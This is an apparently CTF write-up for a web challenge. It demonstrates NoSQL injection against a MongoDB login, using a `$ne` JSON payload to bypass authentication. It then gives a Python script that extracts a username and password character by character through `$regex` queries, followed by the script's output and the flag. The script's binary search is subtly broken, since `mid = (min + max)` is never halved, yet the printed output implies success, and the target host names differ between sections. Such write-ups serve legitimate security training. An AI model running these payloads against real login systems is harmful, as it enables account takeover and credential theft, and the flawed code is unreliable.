# K.U.N.A.L Consulting

- Published: 12/24/2024 (#24/25 in event)
- Category: Web exploitation
- Points: 130
- Author: GodderE2D

“It was snowing this morning,” Agent Aspen said.

“I know it’s your last day—but we have something for you to do. It won’t take long, I promise.”

We’re anticipating that K.U.N.A.L himself is coming after our systems. We have this internal software that another
intern created a few years ago; we’ve been using it ever since they pitched it to Santa. Santa was impressed, but after
taking a closer look it doesn’t look very secure at all.

[https://elforms.csd.lol/](https://elforms.csd.lol/) (source code is attached)

---

_**You are only allowed to test in the scope `https://*elforms.csd.lol/*`.** Blind brute-force request sending (e.g.,
using tools like DirBuster) can trigger Cloudflare rate limits. Do not attempt to bypass Cloudflare limits. Therefore,
if you wish to brute-force, please limit your wordlists or attack scope._

## Attachments

- [Source code](https://files.vipin.xyz/api/public/dl/NcRnfu5V/Day%2024%20-%20ELForms/elforms.tar.gz)

## Hints

**Hint 1:**  
User input should never be trusted, especially not for authentication! As always, check out your browser’s DevTools
(particularly the Elements, Sources, and Network tabs).

**Hint 2:**  
JSON is all powerful; there’s more to it than strings. There’s also an “employee login” page. Humans don’t always have
the best memory and might re-use stuff.

## Write-up

<details>
<summary>Reveal write-up</summary>

Let's take a look at the client JavaScript on the customer login (`/customer-login`) page:

```js
const submitBtn = document.getElementById("submit");

submitBtn.addEventListener("click", async () => {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // don't waste precious cpu cycles on the server
  if (username.length > 7 || password.length > 100) return alert("Invalid username/password");

  const response = await fetch("/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ username, password }),
  });

  const text = await response.text();
  alert(text);

  if (response.status === 200) window.location.href = "/";
});
```

So, it seems like the username can have a maximum of 7 characters and the password can have a maximum of 100 characters.
Well, that doesn't sound very brute-forceable.

We can see that the request is being sent in JSON. Let's look at the JS on the employee login (`/employee-login`) page
now. It's identical to the customer login page, except the client-side checks for usernames and passwords are different:

```js
if (!/^[A-z0-9_]{1,16}$/.test(username)) return alert("Incorrect username/password");
if (!/^[A-z0-9_]{1,128}$/.test(password)) return alert("Incorrect username/password");
```

This [regular expression (regex)](https://en.wikipedia.org/wiki/Regular_expression) checks to see that the username and
password only contains alphanumerical characters or underscores. The maximum length for a username is 16 characters,
while it is 128 characters for passwords.

Well, that's not very useful. However, JSON allows for more than strings. Perhaps, it can accept objects?

A common database used in JavaScript is [MongoDB](https://en.wikipedia.org/wiki/MongoDB). In MongoDB, you can use
[query operators](https://www.mongodb.com/docs/manual/reference/operator/query/) to use more powerful matching filters.

One of them is `$ne`, which matches for everything _except_ what's entered:

```json
// POST /login
{
  "username": {
    "$ne": "test"
  },
  "password": {
    "$ne": "test"
  }
}
```

That returns:

```
Login successful! We have no customers though...so who are you?
```

Wow, it looks like it worked! (sorry about how guessy this was) But, this isn't very useful as we don't receive anything
in this request. We need to obtain a username and password to use in the employee login.

Unfortunately, the same attack doesn't work in `POST /employee-login`. But, our attack can tell us whether a username or
password was correct.

We don't have to guess each character one-by-one, though. MongoDB also offers a `$regex` operator, which allows us to
filter by regex! Through regex, we can optimize our attack and reduce the number of requests needed.

We can utilize a binary search approach:

```py
import re
from time import sleep
import requests

url = "https://kunal-consulting.csd.lol"

request_count = 0

path = "sign-up"
trigger = "taken"
username = ""

# Test a username or password to see if it passes the regex
def test_password(regex):
    global request_count, path, trigger, username

    if path == "login":
      data = {
          "username": username,
          "password": {
              "$regex": regex
          }
      }
    else:
      data = {
          "username": {
              "$regex": regex
          }
      }

    r = requests.post(f'{url}/{path}', json=data, allow_redirects=False)

    request_count += 1

    return trigger in r.text

# Binary search algorithm
def search_once(test_function, prefix=""):
    min = 0
    max = 127

    while min <= max:
        mid = (min + max)

        if test_function(fr'^{re.escape(prefix)}[\x{mid:02x}-\x7f]'):
            min = mid + 1
        else:
            max = mid - 1

    return chr(max)

# Keep searching until whole string found
def search(test_function):
    found = ""
    while True:
        found += search_once(test_function, prefix=found)
        print(found)

        if test_function(fr'^{found}$'):
            return found

username = search(test_password)

path = "login"
trigger = "successful"

password = search(test_password)

print("\nUsername: " + username)
print("Password: " + password)

print(f"Requests made: {request_count}")
```

For each character in the username, it will try half of all possible ASCII character values. If the server returns that
we were successful, that must mean that specific character belongs to that half of that ASCII value. Then, it will
continue to split the ASCII range in half until we find the actual character. It will then repeat this for each
character, until it finds every character.

Afterwards, the script uses the same method to find the password (although that takes just _slightly_ longer).

This script can actually be optimized by only using alphanumerical characters and underscores as seen in the original JS
code. I'll leave that as homework for you (definitely not because I'm lazy).

```
X
Xh
Xha
XhaN
XhaNy
XhaNy2
XhaNy22
r
re
rea
reas
reaso
reason
reasons
reasons_
reasons_i
reasons_i_
reasons_i_u
reasons_i_us
reasons_i_use
reasons_i_use_
reasons_i_use_a
reasons_i_use_a_
reasons_i_use_a_r
reasons_i_use_a_re
reasons_i_use_a_rea
reasons_i_use_a_real
reasons_i_use_a_reall
reasons_i_use_a_really
reasons_i_use_a_really_
reasons_i_use_a_really_l
reasons_i_use_a_really_lo
reasons_i_use_a_really_lon
reasons_i_use_a_really_long
reasons_i_use_a_really_long_
reasons_i_use_a_really_long_p
reasons_i_use_a_really_long_pa
reasons_i_use_a_really_long_pas
reasons_i_use_a_really_long_pass
reasons_i_use_a_really_long_passw
reasons_i_use_a_really_long_passwo
reasons_i_use_a_really_long_passwor
reasons_i_use_a_really_long_password
reasons_i_use_a_really_long_password_
reasons_i_use_a_really_long_password_1
reasons_i_use_a_really_long_password_1_
reasons_i_use_a_really_long_password_1_s
reasons_i_use_a_really_long_password_1_se
reasons_i_use_a_really_long_password_1_sec
reasons_i_use_a_really_long_password_1_secu
reasons_i_use_a_really_long_password_1_secur
reasons_i_use_a_really_long_password_1_securi
reasons_i_use_a_really_long_password_1_securit
reasons_i_use_a_really_long_password_1_security
reasons_i_use_a_really_long_password_1_security_
reasons_i_use_a_really_long_password_1_security_2
reasons_i_use_a_really_long_password_1_security_2_
reasons_i_use_a_really_long_password_1_security_2_t
reasons_i_use_a_really_long_password_1_security_2_to
reasons_i_use_a_really_long_password_1_security_2_to_
reasons_i_use_a_really_long_password_1_security_2_to_p
reasons_i_use_a_really_long_password_1_security_2_to_pr
reasons_i_use_a_really_long_password_1_security_2_to_pra
reasons_i_use_a_really_long_password_1_security_2_to_prac
reasons_i_use_a_really_long_password_1_security_2_to_pract
reasons_i_use_a_really_long_password_1_security_2_to_practi
reasons_i_use_a_really_long_password_1_security_2_to_practic
reasons_i_use_a_really_long_password_1_security_2_to_practice
reasons_i_use_a_really_long_password_1_security_2_to_practice_
reasons_i_use_a_really_long_password_1_security_2_to_practice_m
reasons_i_use_a_really_long_password_1_security_2_to_practice_my
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_t
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_ty
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typ
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typi
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typin
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_s
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_sk
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_ski
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skil
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skill
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_t
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_m
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_me
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mes
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_w
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_wi
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_wit
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_y
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_yo
reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you

Username: XhaNy22
Password: reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you
Requests made: 832
```

It actually only took 832 requests to find the 7-character username and 97-character password!

Now that we have the username and password, we can login on the employee login page (`/employee-login`):

![Employee area page](/blog-assets/kunal-consulting-advent-of-ctf-2024/employee-area.png)

Well, that's something. ~~(elite ball knowledge)~~ Merry three-days-until-Christmas!

Flag: `csd{cOn5uL7iN9_CHIldR3N_5InC3_2009}`

</details>

Write-up by GodderE2D
